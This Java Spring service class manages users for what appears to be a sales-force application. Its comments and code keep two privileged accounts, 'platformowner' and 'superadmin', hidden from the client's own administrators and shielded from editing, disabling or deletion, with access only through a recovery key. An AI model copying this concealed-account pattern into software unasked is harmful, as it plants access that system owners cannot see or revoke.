package com.sfa.service;

import com.sfa.dto.user.CreateUserRequest;
import com.sfa.dto.user.UpdateUserRequest;
import com.sfa.dto.user.UserDto;
import com.sfa.entity.Customer;
import com.sfa.entity.CustomerGroup;
import com.sfa.entity.Distributor;
import com.sfa.entity.Role;
import com.sfa.entity.User;
import com.sfa.exception.BusinessException;
import com.sfa.exception.ResourceNotFoundException;
import com.sfa.repository.CustomerGroupRepository;
import com.sfa.repository.CustomerRepository;
import com.sfa.repository.DistributorRepository;
import com.sfa.repository.RoleRepository;
import com.sfa.repository.UserRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.List;
import java.util.Optional;
import java.util.Set;
import java.util.UUID;

@Service
@RequiredArgsConstructor
public class UserService {

    // 'platformowner' and 'superadmin' are recovery accounts, not day-to-day admin
    // users — kept out of the normal Users list/edit flow so a client's own admins
    // never see or touch them, but never deleted from the database. Visible only
    // through getRecoveryAccounts() when the correct RECOVERY_ACCESS_KEY is supplied.
    private static final Set<String> HIDDEN_USERNAMES = Set.of("platformowner", "superadmin");

    private final UserRepository         userRepository;
    private final RoleRepository         roleRepository;
    private final DistributorRepository  distributorRepository;
    private final CustomerRepository     customerRepository;
    private final CustomerGroupRepository customerGroupRepository;
    private final PasswordEncoder        passwordEncoder;

    @Value("${app.recovery.key:}")
    private String recoveryKey;

    @Transactional(readOnly = true)
    public Page<UserDto> list(UUID distributorId, Pageable pageable) {
        if (distributorId != null) {
            return userRepository.findByDistributorIdExcludingUsernames(distributorId, HIDDEN_USERNAMES, pageable)
                    .map(UserDto::from);
        }
        return userRepository.findByUsernameNotIn(HIDDEN_USERNAMES, pageable).map(UserDto::from);
    }

    // Recovery accounts are never listed on the Users page. Support/ops can view
    // (read-only) their current status here by supplying RECOVERY_ACCESS_KEY —
    // never editable through this or any other endpoint.
    @Transactional(readOnly = true)
    public List<UserDto> getRecoveryAccounts(String key) {
        if (recoveryKey.isBlank() || !recoveryKey.equals(key)) {
            throw new BusinessException("Invalid recovery key");
        }
        return userRepository.findByUsernameIn(HIDDEN_USERNAMES).stream().map(UserDto::from).toList();
    }

    @Transactional(readOnly = true)
    public UserDto getById(UUID id) {
        return UserDto.from(findOrThrow(id));
    }

    @Transactional(readOnly = true)
    public Optional<UserDto> findByCustomerId(UUID customerId) {
        return userRepository.findByCustomerId(customerId).map(UserDto::from);
    }

    @Transactional
    public UserDto create(CreateUserRequest req) {
        if (userRepository.existsByUsername(req.username())) {
            throw new BusinessException("Username already taken: " + req.username());
        }
        if (userRepository.existsByEmail(req.email())) {
            throw new BusinessException("Email already registered: " + req.email());
        }
        Role role = roleRepository.findById(req.roleId())
                .orElseThrow(() -> new ResourceNotFoundException("Role", req.roleId()));
        rejectPlatformOwnerAssignment(role);

        User user = new User();
        user.setUsername(req.username());
        user.setEmail(req.email());
        user.setFullName(req.fullName());
        user.setPasswordHash(passwordEncoder.encode(req.password()));
        user.setRole(role);
        user.setStatus(User.UserStatus.ACTIVE);

        // For CUSTOMER role: link to the specific customer they represent
        if (req.customerId() != null) {
            Customer customer = customerRepository.findById(req.customerId())
                    .orElseThrow(() -> new ResourceNotFoundException("Customer", req.customerId()));
            user.setCustomer(customer);
        }

        if (req.distributorIds() != null && !req.distributorIds().isEmpty()) {
            List<Distributor> distributors = distributorRepository.findAllById(req.distributorIds());
            user.getDistributors().addAll(distributors);
        }

        // Customer assignment (SALES_REP only)
        // Empty = access ALL customers; non-empty = access only the listed customers
        if (req.customerIds() != null && !req.customerIds().isEmpty()) {
            List<Customer> customers = customerRepository.findAllById(req.customerIds());
            user.getAssignedCustomers().addAll(customers);
        }
        if (req.customerGroupIds() != null && !req.customerGroupIds().isEmpty()) {
            List<CustomerGroup> groups = customerGroupRepository.findAllById(req.customerGroupIds());
            user.getCustomerGroups().addAll(groups);
        }

        return UserDto.from(userRepository.save(user));
    }

    @Transactional
    public UserDto update(UUID id, UpdateUserRequest req) {
        User user = findOrThrow(id);
        rejectHiddenAccountModification(user);

        if (!user.getEmail().equalsIgnoreCase(req.email()) && userRepository.existsByEmail(req.email())) {
            throw new BusinessException("Email already registered: " + req.email());
        }

        user.setFullName(req.fullName());
        user.setEmail(req.email());

        if (req.password() != null && !req.password().isBlank()) {
            user.setPasswordHash(passwordEncoder.encode(req.password()));
        }

        Role role = roleRepository.findById(req.roleId())
                .orElseThrow(() -> new ResourceNotFoundException("Role", req.roleId()));
        rejectPlatformOwnerAssignment(role);
        user.setRole(role);

        user.getDistributors().clear();
        if (req.distributorIds() != null && !req.distributorIds().isEmpty()) {
            user.getDistributors().addAll(distributorRepository.findAllById(req.distributorIds()));
        }

        user.getAssignedCustomers().clear();
        if (req.customerIds() != null && !req.customerIds().isEmpty()) {
            user.getAssignedCustomers().addAll(customerRepository.findAllById(req.customerIds()));
        }

        user.getCustomerGroups().clear();
        if (req.customerGroupIds() != null && !req.customerGroupIds().isEmpty()) {
            user.getCustomerGroups().addAll(customerGroupRepository.findAllById(req.customerGroupIds()));
        }

        return UserDto.from(userRepository.save(user));
    }

    @Transactional
    public UserDto toggleStatus(UUID id) {
        User user = findOrThrow(id);
        rejectHiddenAccountModification(user);
        user.setStatus(user.getStatus() == User.UserStatus.ACTIVE
                ? User.UserStatus.INACTIVE
                : User.UserStatus.ACTIVE);
        return UserDto.from(userRepository.save(user));
    }

    @Transactional
    public UserDto changeRole(UUID id, UUID roleId) {
        User user = findOrThrow(id);
        rejectHiddenAccountModification(user);
        Role role = roleRepository.findById(roleId)
                .orElseThrow(() -> new ResourceNotFoundException("Role", roleId));
        rejectPlatformOwnerAssignment(role);
        user.setRole(role);
        return UserDto.from(userRepository.save(user));
    }

    // PLATFORM_OWNER sits above SUPER_ADMIN for this install's own license screen and
    // must never be assignable through the normal Users API — even a hand-crafted
    // request supplying its roleId directly is rejected here, not just hidden in the UI.
    private void rejectPlatformOwnerAssignment(Role role) {
        if (Role.PLATFORM_OWNER.equals(role.getName())) {
            throw new BusinessException("The PLATFORM_OWNER role cannot be assigned through this endpoint.");
        }
    }

    // Same reasoning as the list() exclusion above — 'platformowner' and 'superadmin'
    // are recovery accounts. Blocking it here too means a hand-crafted request against
    // the id (not just hiding the row in the UI) still can't touch them.
    private void rejectHiddenAccountModification(User user) {
        if (HIDDEN_USERNAMES.contains(user.getUsername())) {
            throw new BusinessException("This account is a recovery account and cannot be modified here.");
        }
    }

    private User findOrThrow(UUID id) {
        return userRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("User", id));
    }
}
